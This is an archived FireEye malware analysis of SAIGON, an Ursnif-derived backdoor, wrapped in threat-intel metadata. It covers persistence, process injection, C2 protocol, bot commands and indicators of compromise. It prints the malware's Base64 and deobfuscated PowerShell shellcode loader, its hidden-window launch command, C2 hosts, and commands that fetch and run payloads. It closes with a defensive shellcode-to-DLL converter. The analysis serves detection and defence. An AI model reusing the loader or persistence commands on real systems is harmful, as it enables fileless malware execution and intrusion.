{
    "id": "23d02941-5aea-4710-babe-f2aafd501618",
    "created_at": "2023-01-12T15:08:12.418401Z",
    "updated_at": "2025-03-27T02:09:43.001156Z",
    "deleted_at": null,
    "sha1_hash": "f4496060a66c04591abadf6945df10635b40b12b",
    "title": "2020-01-09 - SAIGON, the Mysterious Ursnif Fork",
    "authors": "",
    "file_creation_date": "2022-05-28T16:54:04Z",
    "file_modification_date": "2022-05-28T16:54:04Z",
    "file_size": 140013,
    "plain_text": "# SAIGON, the Mysterious Ursnif Fork\n\n**[fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html](https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html)**\n\nThreat Research\n\nSandor Nemes, Zander Work\n\nJan 09, 2020\n\n14 mins read\n\nMalware\n\nThreat Research\n\nUrsnif (aka Gozi/Gozi-ISFB) is one of the oldest banking malware families still in active distribution. While the first\nmajor version of Ursnif was identified in 2006, several subsequent versions have been released in large part due\nsource code leaks. FireEye reported on a previously unidentified variant of the Ursnif malware family to our threat\nintelligence subscribers in September 2019 after identification of a server that hosted a collection of tools, which\nincluded multiple point-of-sale malware families. This malware self-identified as \"SaiGon version 3.50 rev 132,\" and\nour analysis suggests it is likely based on the source code of the v3 (RM3) variant of Ursnif. Notably, rather than\nbeing a full-fledged banking malware, SAIGON's capabilities suggest it is a more generic backdoor, perhaps\ntailored for use in targeted cybercrime operations.\n\n**Technical Analysis**\n\nBehavior\n\n\n-----\n\nSAIGON appears on an infected computer as a Base64 encoded shellcode blob stored in a registry key, which is\nlaunched using PowerShell via a scheduled task. As with other Ursnif variants, the main component of the malware\nis a DLL file. This DLL has a single exported function, DllRegisterServer, which is an unused empty function. All the\nrelevant functionality of the malware executes when the DLL is loaded and initialized via its entry point.\n\nUpon initial execution, the malware generates a machine ID using the creation timestamp of either\n_%SystemDrive%\\pagefile.sys or %SystemDrive%\\hiberfil.sys (whichever is identified first). Interestingly, the system_\ndrive is queried in a somewhat uncommon way, directly from the KUSER_SHARED_DATA structure (via\n_SharedUserData→NtSystemRoot). KUSER_SHARED_DATA is a structure located in a special part of kernel_\nmemory that is mapped into the memory space of all user-mode processes (thus shared), and always located at a\nfixed memory address (0x7ffe0000, pointed to by the SharedUserData symbol).\n\nThe code then looks for the current shell process by using a call to\n_GetWindowThreadProcessId(GetShellWindow(), …). The code also features a special check; if the checksum_\ncalculated from the name of the shell's parent process matches the checksum of explorer.exe (0xc3c07cf0), it will\nattempt to inject into the parent process instead.\n\nSAIGON then injects into this process using the classic VirtualAllocEx / WriteProcessMemory /\n_CreateRemoteThread combination of functions. Once this process is injected, it loads two embedded files from_\nwithin its binary:\n\nA PUBLIC.KEY file, which is used to verify and decrypt other embedded files and data coming from the\nmalware's command and control (C2) server\nA RUN.PS1 file, which is a PowerShell loader script template that contains a \"@SOURCE@\" placeholder\nwithin the script:\n\n$hanksefksgu = [System.Convert]::FromBase64String(\"@SOURCE@\");\nInvoke-Expression\n([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\"JHdneG1qZ2J4dGo9JGh\nhbmtzZWZrc2d1Lkxlbmd0aDskdHNrdm89IltEbGxJbXBvcnQoYCJrZXJuZWwzMmAiKV1gbnB1YmxpYyBzdGF\n0aWMgZXh0ZXJuIEludDMyIEdldEN1cnJlbnRQcm9jZXNzKCk7YG5bRGxsSW1wb3J0KGAidXNlcjMyYCIpXWB\nucHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldERDKEludFB0ciBteHhhaHhvZik7YG5bRGxsSW1wb3J0K\nGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlUmVtb3RlVGhyZWFkKEl\nudFB0ciBoY3d5bHJicywgSW50UHRyIHdxZXIsdWludCBzZmosSW50UHRyIHdsbGV2LEludFB0ciB3d2RyaWN\n0d2RrLHVpbnQga2xtaG5zayxJbnRQdHIgdmNleHN1YWx3aGgpO2BuW0RsbEltcG9ydChgImtlcm5lbDMyYCI\npXWBucHVibGljIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGFqLC\nBVSW50MzIga2R4c3hldik7YG5bRGxsSW1wb3J0KGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dG\nVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciB4eSx1aW50IGtuYnQsdWludCB0bXJ5d2h1LHVpbnQgd2d1\ndHVkKTsiOyR0c2thYXhvdHhlPUFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICR0c2t2byAtTmFtZSAnV2luMzI\nnIC1uYW1lc3BhY2UgV2luMzJGdW5jdGlvbnMgLXBhc3N0aHJ1OyRtaHhrcHVsbD0kdHNrYWF4b3R4ZTo6Vml\nydHVhbEFsbG9jKDAsJHdneG1qZ2J4dGosMHgzMDAwLDB4NDApO1tTeXN0ZW0uUnVudGltZS5JbnRlcm9wU\n2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGhhbmtzZWZrc2d1LDAsJG1oeGtwdWxsLCR3Z3htamdieHRqKTskd\nGRvY25ud2t2b3E9JHRza2FheG90eGU6OkNyZWF0ZVJlbW90ZVRocmVhZCgtMSwwLDAsJG1oeGtwdWxsLC\nRtaHhrcHVsbCwwLDApOyRvY3h4am1oaXltPSR0c2thYXhvdHhlOjpXYWl0Rm9yU2luZ2xlT2JqZWN0KCR0ZG\n9jbm53a3ZvcSwzMDAwMCk7\")));\n\nThe malware replaces the \"@SOURCE@\" placeholder from this PowerShell script template with a Base64encoded version of itself, and writes the PowerShell script to a registry value named \"PsRun\" under the\n\"HKEY_CURRENT_USER\\Identities\\{<random_guid>}\" registry key (Figure 1).\n\n\n-----\n\nPowerShell script written to PsRun\n\n\nFigure 1: PowerShell script\n\nwritten to PsRun\nThe instance of SAIGON then creates a new scheduled task (Figure 2) with the name \"Power<random_word>\"\n(e.g. PowerSgs). If this is unsuccessful for any reason, it falls back to using the\n\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" registry key to enable itself to\nmaintain persistence through system reboot.\n\n\n-----\n\nScheduled task\n\n\nFigure 2: Scheduled task\n\nRegardless of the persistence mechanism used, the command that executes the binary from the registry is similar\nto the following:\n\nPowerShell.exe -windowstyle hidden -ec\naQBlAHgAIAAoAGcAcAAgACcASABLAEMAVQA6AFwASQBkAGUAbgB0AGkAdABpAGUAcwBcAHsANAAzAEIA\nOQA1AEUANQBCAC0ARAAyADEAOAAtADAAQQBCADgALQA1AEQANwBGAC0AMgBDADcAOAA5AEMANQA5\nAEIAMQBEAEYAfQAnACkALgBQAHMAUgB1AG4A\n\nAfter removing the Base64 encoding from this command, it looks something like \"iex (gp 'HKCU:\\\\Identities\\\\\n_{43B95E5B-D218-0AB8-5D7F-2C789C59B1DF}').PsRun.\" When executed, this command retrieves the contents of_\nthe previous registry value using Get-ItemProperty (gp) and executes it using Invoke-Expression (iex).\n\nFinally, the PowerShell code in the registry allocates a block of memory, copies the Base64-decoded shellcode\nblob into it, launches a new thread pointing to the area using CreateRemoteThread, and waits for the thread to\ncomplete. The following script is a deobfuscated and beautified version of the PowerShell.\n\n\n-----\n\n$hanksefksgu = [System.Convert]::FromBase64String(\"@SOURCE@\");\n$wgxmjgbxtj = $hanksefksgu.Length;\n\n$tskvo = @\"\n\n[DllImport(\"kernel32\")]\npublic static extern Int32 GetCurrentProcess();\n\n[DllImport(\"user32\")]\npublic static extern IntPtr GetDC(IntPtr mxxahxof);\n\n[DllImport(\"kernel32\")]\npublic static extern IntPtr CreateRemoteThread(IntPtr hcwylrbs, IntPtr wqer, uint sfj, IntPtr wllev, IntPtr\nwwdrictwdk, uint klmhnsk, IntPtr vcexsualwhh);\n\n[DllImport(\"kernel32\")]\npublic static extern UInt32 WaitForSingleObject(IntPtr aj, UInt32 kdxsxev);\n\n[DllImport(\"kernel32\")]\npublic static extern IntPtr VirtualAlloc(IntPtr xy, uint knbt, uint tmrywhu, uint wgutud);\n\"@;\n\n$tskaaxotxe = Add-Type -memberDefinition $tskvo -Name 'Win32' -namespace Win32Functions -passthru;\n$mhxkpull = $tskaaxotxe::VirtualAlloc(0, $wgxmjgbxtj, 0x3000, 0x40);\n\n[System.Runtime.InteropServices.Marshal]::Copy($hanksefksgu, 0, $mhxkpull, $wgxmjgbxtj);\n$tdocnnwkvoq = $tskaaxotxe::CreateRemoteThread(-1, 0, 0, $mhxkpull, $mhxkpull, 0, 0);\n$ocxxjmhiym = $tskaaxotxe::WaitForSingleObject($tdocnnwkvoq, 30000);\n\nOnce it has established a foothold on the machine, SAIGON loads and parses its embedded LOADER.INI\nconfiguration (see the Configuration section for details) and starts its main worker thread, which continuously polls\nthe C2 server for commands.\n\nConfiguration\n\nThe Ursnif source code incorporated a concept referred to as \"joined data,\" which is a set of compressed/encrypted\nfiles bundled with the executable file. Early variants relied on a special structure after the PE header and marked\nwith specific magic bytes (\"JF,\" \"FJ,\" \"J1,\" \"JJ,\" depending on the Ursnif version). In Ursnif v3 (Figure 3), this data is\nno longer simply after the PE header but pointed to by the Security Directory in the PE header, and the magic bytes\nhave also been changed to \"WD\" (0x4457).\n\n\n-----\n\nUrsnif v3 joined data\n\n\nFigure 3: Ursnif v3 joined\n\ndata\nThis structure defines the various properties (offset, size, and type) of the bundled files. This is the same exact\nmethod used by SAIGON for storing its three embedded files:\n\n_PUBLIC.KEY - RSA public key_\n_RUN.PS1 - PowerShell script template_\n_LOADER.INI - Malware configuration_\n\nThe following is a list of configuration options observed:\n\n\n**Name**\n**Checksum**\n\n\n**Name** **Description**\n\n\n_0x97ccd204_ _HostsList_ List of C2 URLs used for communication\n\n_0xd82bcb60_ _ServerKey_ Serpent key used for communicating with the C2\n\n_0x23a02904_ _Group_ Botnet ID\n\n_0x776c71c0_ _IdlePeriod_ Number of seconds to wait before the initial request to the C2\n\n_0x22aa2818_ _MinimumUptime_ Waits until the uptime is greater than this value (in seconds)\n\n\n-----\n\n_0x5beb543e_ _LoadPeriod_ Number of seconds to wait between subsequent requests to the C2\n\n_0x84485ef2_ _HostKeepTime_ The number of minutes to wait before switching to the next C2 server in\ncase of failures\n\nTable 1: Configuration options\n\nCommunication\n\nWhile the network communication structure of SAIGON is very similar to Ursnif v3, there are some subtle\ndifferences. SAIGON beacons are sent to the C2 servers as multipart/form-data encoded requests via HTTP POST\nto the \"/index.html\" URL path. The payload to be sent is first encrypted using Serpent encryption (in ECB mode vs\nCBC mode), then Base64-encoded. Responses from the server are encrypted with the same Serpent key and\nsigned with the server's RSA private key.\n\nSAIGON uses the following User-Agent header in its HTTP requests: \"Mozilla/5.0 (Windows NT <os_version>;\n_rv:58.0) Gecko/20100101 Firefox/58.0,\" where <os_version> consists of the operating system's major and minor_\nversion number (e.g. 10.0 on Windows 10, and 6.1 on Windows 7) and the string \"; Win64; x64\" is appended when\nthe operating system is 64-bit. This yields the following example User Agent strings:\n\n\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\" on Windows 10 64-bit\n\"Mozilla/5.0 (Windows NT 6.1; rv:58.0) Gecko/20100101 Firefox/58.0\" on Windows 7 32-bit\n\nThe request format is also somewhat similar to the one used by other Ursnif variants described in Table 2:\n\nver=%u&group=%u&id=%08x%08x%08x%08x&type=%u&uptime=%u&knock=%u\n\n**Name** **Description**\n\n_ver_ Bot version (unlike other Ursnif variants this only contains the build number, so only the xxx digits from\n\"3.5.xxx\")\n\n_group_ Botnet ID\n\n_id_ Client ID\n\n_type_ Request type (0 – when polling for tasks, 6 – for system info data uploads)\n\n_uptime_ Machine uptime in seconds\n\n_knock_ The bot \"knock\" period (number of seconds to wait between subsequent requests to the C2, see the\nLoadPeriod configuration option)\n\nTable 2: Request format components\n\nCapabilities\n\nSAIGON implements the bot commands described in Table 3.\n\n\n-----\n\n**Name**\n**Checksum**\n\n\n**Name** **Description**\n\n\n_0x45d4bf54_ _SELF_DELETE_ Uninstalls itself from the machine; removes scheduled task and deletes its\nregistry key\n\n_0xd86c3bdc_ _LOAD_UPDATE_ Download data from URL, decrypt and verify signature, save it as a .ps1 file\nand run it using \"PowerShell.exe -ep unrestricted -file %s\"\n\n_0xeac44e42_ _GET_SYSINFO_ Collects and uploads system information by running:\n\n1. \"systeminfo.exe\"\n2. \"net view\"\n3. \"nslookup 127.0.0.1\"\n4. \"tasklist.exe /SVC\"\n5. \"driverquery.exe\"\n6. \"reg.exe query\n\n\"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s\"\n\n_0x83bf8ea0_ _LOAD_DLL_ Download data from URL, decrypt and verify, then use the same shellcode\nloader that was used to load itself into memory to load the DLL into the current\nprocess\n\n_0xa8e78c43_ _LOAD_EXE_ Download data from URL, decrypt and verify, save with an .exe extension,\ninvoke using ShellExecute\n\nTable 3: SAIGON bot commands\n\nComparison to Ursnif v3\n\nTable 4 shows the similarities between Ursnif v3 and the analyzed SAIGON samples (differences are highlighted in\n**bold):**\n\n**Ursnif v3 (RM3)** **Saigon (Ursnif v3.5?)**\n\n\n_Persistence method_ Scheduled task that executes code stored\nin a registry key using PowerShell\n\n_Configuration storage_ Security PE directory points to embedded\nbinary data starting with 'WD' magic bytes\n(aka. Ursnif \"joined files\")\n\n\nScheduled task that executes code stored\nin a registry key using PowerShell\n\nSecurity PE directory points to embedded\nbinary data starting with 'WD' magic bytes\n(aka. Ursnif \"joined files\")\n\n\n_PRNG algorithm_ xorshift64* xorshift64*\n\n\n_Checksum algorithm_ **JAMCRC (aka. CRC32 with all the bits**\n**flipped)**\n\n\n**CRC32, with the result rotated to the**\n**right by 1 bit**\n\n\n_Data compression_ aPLib aPLib\n\n_Encryption/Decryption_ Serpent CBC Serpent ECB\n\n\n-----\n\n_Data integrity_\n_verification_\n\n_Communication_\n_method_\n\n\nRSA signature RSA signature\n\nHTTP POST requests HTTP POST requests\n\n\n_Payload encoding_ Unpadded Base64 ('+' and '/' are replaced\nwith '_2B' and '_2F' respectively), random\n**slashes are added**\n\n\nUnpadded Base64 ('+' and '/' are replaced\nwith '%2B' and '%2F' respectively), no\n**random slashes**\n\n\n_Uses URL path_\n_mimicking?_\n\n\n**Yes** **No**\n\n\n_Uses PX file format?_ **Yes** **No**\n\nTable 4: Similarities and differences between Ursnif v3 and SAIGON samples\n\nFigure 4 shows Ursnif v3's use of URL path mimicking. This tactic has not been seen in other Ursnif variants,\nincluding SAIGON.\n\nUrsnif v3 mimicking (red) previously seen benign browser traffic (green) not seen in\nSAIGON samples\n\n\nFigure 4: Ursnif v3\n\nmimicking (red) previously seen benign browser traffic (green) not seen in SAIGON samples\n\n**Implications**\n\n\n-----\n\nIt is currently unclear whether SAIGON is representative of a broader evolution in the Ursnif malware ecosystem.\nThe low number of SAIGON samples identified thus far—all of which have compilations timestamps in 2018—may\nsuggest that SAIGON was a temporary branch of Ursnif v3 adapted for use in a small number of operations.\nNotably, SAIGON’s capabilities also distinguish it from typical banking malware and may be more suited toward\nsupporting targeted intrusion operations. This is further supported via our prior identification of SAIGON on a server\n[that hosted tools used in point-of-sale intrusion operations as well as VISA’s recent notification of the malware](https://usa.visa.com/dam/VCOM/global/support-legal/documents/cybercrime-groups-targeting-fuel-dispenser-merchants.pdf)\nappearing on a compromised hospitality organization’s network along with tools previously used by FIN8.\n\n**Acknowledgements**\n\nThe authors would like to thank Kimberly Goody, Jeremy Kennelly and James Wyke for their support on this blog\npost.\n\n**Appendix A: Samples**\n\nThe following is a list of samples including their embedded configuration:\n\nSample SHA256: 8ded07a67e779b3d67f362a9591cce225a7198d2b86ec28bbc3e4ee9249da8a5\n\nSample Version: 3.50.132\n\nPE Timestamp: 2018-07-07T14:51:30\n\nXOR Cookie: 0x40d822d9\n\nC2 URLs:\n\nhttps://google-download[.]com\nhttps://cdn-google-eu[.]com\nhttps://cdn-gmail-us[.]com\n\nGroup / Botnet ID: 1001\n\nServer Key: rvXxkdL5DqOzIRfh\n\nIdle Period: 30\n\nLoad Period: 300\n\nHost Keep Time: 1440\n\nRSA Public Key:\n(0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b1502ccb5c\n\n021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f593518a2cf4915\n\nd0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)\n\nSample SHA256: c6a27a07368abc2b56ea78863f77f996ef4104692d7e8f80c016a62195a02af6\n\nSample Version: 3.50.132\n\nPE Timestamp: 2018-07-07T14:51:41\n\nXOR Cookie: 0x40d822d9\n\nC2 URLs:\n\nhttps://google-download[.]com\nhttps://cdn-google-eu[.]com\nhttps://cdn-gmail-us[.]com\n\nGroup / Botnet ID: 1001\n\nServer Key: rvXxkdL5DqOzIRfh\n\nIdle Period: 30\n\nLoad Period: 300\n\nHost Keep Time: 1440\n\nRSA Public Key:\n\n\n-----\n\n(0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b1502ccb5c\n021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f593518a2cf4915\nd0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)\n\nSample SHA256: 431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e\nSample Version: 3.50.199\nPE Timestamp: 2018-11-15T11:17:09\nXOR Cookie: 0x40d822d9\nC2 URLs:\n\nhttps://mozilla-yahoo[.]com\nhttps://cdn-mozilla-sn45[.]com\nhttps://cdn-digicert-i31[.]com\n\nGroup / Botnet ID: 1000\nServer Key: rvXxkdL5DqOzIRfh\nIdle Period: 60\nLoad Period: 300\nHost Keep Time: 1440\nRSA Public Key:\n(0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b15\n02ccb5c021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f5\n93518a2cf4915d0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)\n\nSample SHA256: 628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9\nSample Version: 3.50.209\nPE Timestamp: 2018-12-04T10:47:56\nXOR Cookie: 0x40d822d9\nC2 URLs\n\nhttp://softcloudstore[.]com\nhttp://146.0.72.76\nhttp://setworldtime[.]com\nhttps://securecloudbase[.]com\n\nBotnet ID: 1000\nServer Key: 0123456789ABCDEF\nIdle Period: 20\nMinimum Uptime: 300\nLoad Period: 1800\nHost Keep Time: 360\nRSA Public Key:\n(0xdb7c3a9ea68fbaf5ba1aebc782be3a9e75b92e677a114b52840d2bbafa8ca49da40a64664d80cd62d9453\n34f8457815dd6e75cffa5ee33ae486cb6ea1ddb88411d97d5937ba597e5c430a60eac882d8207618d14b660\n70ee8137b4beb8ecf348ef247ddbd23f9b375bb64017a5607cb3849dc9b7a17d110ea613dc51e9d2aded, 0x10001)\n\n**Appendix B: IOCs**\n\nSample hashes:\n\n8ded07a67e779b3d67f362a9591cce225a7198d2b86ec28bbc3e4ee9249da8a5\nc6a27a07368abc2b56ea78863f77f996ef4104692d7e8f80c016a62195a02af6\n[431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e [VT]](https://www.virustotal.com/gui/file/431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e)\n[628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9 [VT]](https://www.virustotal.com/gui/file/628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9)\n\n\n-----\n\nC2 servers:\n\nhttps://google-download[.]com\nhttps://cdn-google-eu[.]com\nhttps://cdn-gmail-us[.]com\nhttps://mozilla-yahoo[.]com\nhttps://cdn-mozilla-sn45[.]com\nhttps://cdn-digicert-i31[.]com\nhttp://softcloudstore[.]com\nhttp://146.0.72.76\nhttp://setworldtime[.]com\nhttps://securecloudbase[.]com\n\nUser-Agent:\n\n\"Mozilla/5.0 (Windows NT <os_version>; rv:58.0) Gecko/20100101 Firefox/58.0\"\n\nOther host-based indicators:\n\n\"Power<random_string>\" scheduled task\n\"PsRun\" value under the HKCU\\Identities\\{<random_guid>} registry key\n\n**Appendix C: Shellcode Converter Script**\n\nThe following Python script is intended to ease analysis of this malware. This script converts the SAIGON\nshellcode blob back into its original DLL form by removing the PE loader and restoring its PE header. These\nchanges make the analysis of SAIGON shellcode blobs much simpler (e.g. allow loading of the files in IDA),\nhowever, the created DLLs will still crash when run in a debugger as the malware still relies on its (now removed)\nPE loader during the process injection stage of its execution. After this conversion process, the sample is relatively\neasy to analyze due to its small size and because it is not obfuscated.\n\n#!/usr/bin/env python3\n\nimport argparse\n\nimport struct\n\nfrom datetime import datetime\n\nMZ_HEADER = bytes.fromhex(\n\n'4d5a90000300000004000000ffff0000'\n\n'b8000000000000004000000000000000'\n\n'00000000000000000000000000000000'\n\n'00000000000000000000000080000000'\n\n'0e1fba0e00b409cd21b8014ccd215468'\n\n'69732070726f6772616d2063616e6e6f'\n\n'742062652072756e20696e20444f5320'\n\n'6d6f64652e0d0d0a2400000000000000'\n\n)\n\ndef main():\n\nparser = argparse.ArgumentParser(description=\"Shellcode to PE converter for the Saigon malware family.\")\n\nparser.add_argument(\"sample\")\n\nargs = parser.parse_args()\n\nwith open(args.sample, \"rb\") as f:\n\ndata = bytearray(f.read())\n\nif data.startswith(b'MZ'):\n\nlfanew = struct.unpack_from('=I', data, 0x3c)[0]\n\nprint('This is already an MZ/PE file.')\n\nreturn\n\n\n-----\n\nelif not data.startswith(b \\xe9 ):\nprint('Unknown file type.')\nreturn\n\nstruct.pack_into('=I', data, 0, 0x00004550)\nif data[5] == 0x01:\nstruct.pack_into('=H', data, 4, 0x14c)\nelif data[5] == 0x86:\nstruct.pack_into('=H', data, 4, 0x8664)\nelse:\nprint('Unknown architecture.')\nreturn\n\n# file alignment\nstruct.pack_into('=I', data, 0x3c, 0x200)\n\noptional_header_size, _ = struct.unpack_from('=HH', data, 0x14)\nmagic, _, _, size_of_code = struct.unpack_from('=HBBI', data, 0x18)\nprint('Magic:', hex(magic))\nprint('Size of code:', hex(size_of_code))\n\nbase_of_code, base_of_data = struct.unpack_from('=II', data, 0x2c)\n\nif magic == 0x20b:\n# base of data, does not exist in PE32+\nif size_of_code & 0x0fff:\ntmp = (size_of_code & 0xfffff000) + 0x1000\nelse:\ntmp = size_of_code\nbase_of_data = base_of_code + tmp\n\nprint('Base of code:', hex(base_of_code))\nprint('Base of data:', hex(base_of_data))\n\ndata[0x18 + optional_header_size : 0x1000] = b'\\0' * (0x1000 - 0x18 - optional_header_size)\n\nsize_of_header = struct.unpack_from('=I', data, 0x54)[0]\n\ndata_size = 0x3000\npos = data.find(struct.pack('=IIIII', 3, 5, 7, 11, 13))\nif pos >= 0:\ndata_size = pos - base_of_data\n\nsection = 0\nstruct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,\nb'.text',\nsize_of_code, base_of_code,\nbase_of_data - base_of_code, size_of_header,\n0, 0,\n0, 0,\n0x60000020\n)\nsection += 1\nstruct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,\nb'.rdata',\ndata_size, base_of_data,\ndata_size, size_of_header + base_of_data - base_of_code,\n0, 0,\n0, 0,\n0x40000040\n)\nsection += 1\nstruct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,\nb'.data',\n\n0x1000 base of data + data size\n\n\n-----\n\n0x1000, size_of_header base_of_data base_of_code data_size,\n0, 0,\n0, 0,\n0xc0000040\n)\n\nif magic == 0x20b:\nsection += 1\nstruct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,\nb'.pdata',\n0x1000, base_of_data + data_size + 0x1000,\n0x1000, size_of_header + base_of_data - base_of_code + data_size + 0x1000,\n0, 0,\n0, 0,\n0x40000040\n)\nsection += 1\nstruct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,\nb'.bss',\n0x1600, base_of_data + data_size + 0x2000,\nlen(data[base_of_data + data_size + 0x2000:]), size_of_header + base_of_data - base_of_code +\ndata_size + 0x2000,\n0, 0,\n0, 0,\n0xc0000040\n)\nelse:\nsection += 1\nstruct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,\nb'.bss',\n0x1000, base_of_data + data_size + 0x1000,\n0x1000, size_of_header + base_of_data - base_of_code + data_size + 0x1000,\n0, 0,\n0, 0,\n0xc0000040\n)\nsection += 1\nstruct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,\nb'.reloc',\n0x2000, base_of_data + data_size + 0x2000,\nlen(data[base_of_data + data_size + 0x2000:]), size_of_header + base_of_data - base_of_code +\ndata_size + 0x2000,\n0, 0,\n0, 0,\n0x40000040\n)\n\nheader = MZ_HEADER + data[:size_of_header - len(MZ_HEADER)]\npe = bytearray(header + data[0x1000:])\nwith open(args.sample + '.dll', 'wb') as f:\nf.write(pe)\n\nlfanew = struct.unpack_from('=I', pe, 0x3c)[0]\ntimestamp = struct.unpack_from('=I', pe, lfanew + 8)[0]\nprint('PE timestamp:', datetime.utcfromtimestamp(timestamp).isoformat())\n\nif __name__ == \"__main__\":\nmain()\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-09 - SAIGON, the Mysterious Ursnif Fork.pdf"
    ],
    "report_names": [
        "2020-01-09 - SAIGON, the Mysterious Ursnif Fork.pdf"
    ],
    "threat_actors": [
        {
            "id": "72d09c17-e33e-4c2f-95db-f204848cc797",
            "created_at": "2022-10-25T15:50:23.832551Z",
            "updated_at": "2025-03-27T02:00:55.554841Z",
            "deleted_at": null,
            "main_name": "FIN8",
            "aliases": [
                "FIN8",
                "Syssphinx"
            ],
            "source_name": "MITRE:FIN8",
            "tools": [
                "BADHATCH",
                "PUNCHBUGGY",
                "Ragnar Locker",
                "PUNCHTRACK",
                "dsquery",
                "Nltest",
                "Sardonic",
                "PsExec",
                "Impacket"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "fc80a724-e567-457c-82bb-70147435e129",
            "created_at": "2022-10-25T16:07:23.624289Z",
            "updated_at": "2025-03-27T02:02:09.892602Z",
            "deleted_at": null,
            "main_name": "FIN8",
            "aliases": [
                "ATK 113",
                "Syssphinx"
            ],
            "source_name": "ETDA:FIN8",
            "tools": [
                "ALPHV",
                "ALPHVM",
                "BadHatch",
                "BlackCat",
                "Noberus",
                "PSVC",
                "PUNCHTRACK",
                "PoSlurp",
                "Powersniff",
                "PunchBuggy",
                "Ragnar Locker",
                "RagnarLocker",
                "Sardonic",
                "ShellTea"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5bdde906-0416-42ee-9100-5ebd95dda77a",
            "created_at": "2023-01-06T13:46:38.601977Z",
            "updated_at": "2025-03-27T02:00:02.870694Z",
            "deleted_at": null,
            "main_name": "FIN8",
            "aliases": [
                "ATK113",
                "G0061"
            ],
            "source_name": "MISPGALAXY:FIN8",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536092,
    "ts_updated_at": 1743041383,
    "ts_creation_date": 1653756844,
    "ts_modification_date": 1653756844,
    "files": {
        "pdf": "https://archive.orkl.eu/f4496060a66c04591abadf6945df10635b40b12b.pdf",
        "text": "https://archive.orkl.eu/f4496060a66c04591abadf6945df10635b40b12b.txt",
        "img": "https://archive.orkl.eu/f4496060a66c04591abadf6945df10635b40b12b.jpg"
    }
}